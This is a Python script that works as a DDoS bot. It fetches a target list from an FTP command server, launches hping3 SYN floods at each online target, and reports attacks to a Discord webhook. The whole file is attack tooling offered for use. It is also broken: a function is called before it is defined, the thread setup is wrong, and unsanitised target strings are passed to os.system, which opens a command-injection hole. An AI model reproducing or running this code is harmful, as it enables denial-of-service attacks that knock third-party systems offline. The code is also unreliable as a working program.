# github.com/b1bxonty
# ALL RIGHTS RESERVED
#

import io, os, json, ftplib, dotenv, threading, time, os
import DiscordWebhook
dotenv.load_dotenv()

#get jobs from ftp server and save variable jobs
ftp = ftplib.FTP(os.getenv("ftp_host"))
ftp.login(user=os.getenv("ftp_user"), passwd = os.getenv("ftp_password"))
#check if file exists
if "jobs.json" in ftp.nlst():
    #get file
    ftp.retrbinary("RETR jobs.json", open('jobs.json', 'wb').write)

    #load file
    with open('jobs.json') as f:
        jobs = json.load(f)
else:
    jobs = []

#close connection
ftp.quit()

def saveftp():
    #connect to ftp server
    ftp = ftplib.FTP(os.getenv("ftp_host"))
    ftp.login(user=os.getenv("ftp_user"), passwd = os.getenv("ftp_password"))

    #if file exists, delete it
    if "jobs.json" in ftp.nlst():
        ftp.delete("jobs.json")

    #upload file
    ftp.storbinary('STOR jobs.json', io.BytesIO(json.dumps(jobs).encode('utf8')))

    #end delete file
    os.remove("jobs.json")

    #close connection
    ftp.quit()

###############################################################################################

# while loop and check jobs every 5 seconds
while True:
    #get jobs from ftp server and save variable jobs
    ftp = ftplib.FTP(os.getenv("ftp_host"))
    ftp.login(user=os.getenv("ftp_user"), passwd = os.getenv("ftp_password"))
    #check if file exists
    if "jobs.json" in ftp.nlst():
        #get file
        ftp.retrbinary("RETR jobs.json", open('jobs.json', 'wb').write)

        #load file
        with open('jobs.json') as f:
            jobs = json.load(f)
    else:
        jobs = []

    #close connection
    ftp.quit()

    #check every job in jobs
    for job in jobs:
        #if job is ddos
        if job["type"] == "ddos":
            #check if target is online
            if os.system("ping -c 1 " + job["target"]) == 0:
                #if online, send ddos attack
                os.system("hping3 -S -p 80 -i u1000 " + job["target"])
            else:
                #if not online, remove job from jobs
                jobs.remove(job)
                saveftp()
                print("Removed job " + job["target"] + " from jobs.json because target is offline.")
    time.sleep(5)

    #if jobs is not empty, start ddos attack with threads
    if jobs != []:
        #get number of threads
        threads = int(input("How many threads? "))
        #start threads
        for i in range(threads):
            t = threading.Thread(target=ddosattack(job["target"]))
            t.start()
            def ddosattack(target):
                #check if target is online
                if os.system("ping -c 1 " + target) == 0:
                    #if online, send ddos attack
                    os.system("hping3 -S -p 80 -i u1000 " + target)
                    #send webhook with more details
                    webhook = DiscordWebhook(url=os.getenv("webhook_url"), content="Sent ddos attack to " + target)
                    response = webhook.execute()
                else:
                    #if not online, remove job from jobs
                    jobs.remove(job)
                    saveftp()
                    print("Removed job " + job["target"] + " from jobs.json because target is offline.")              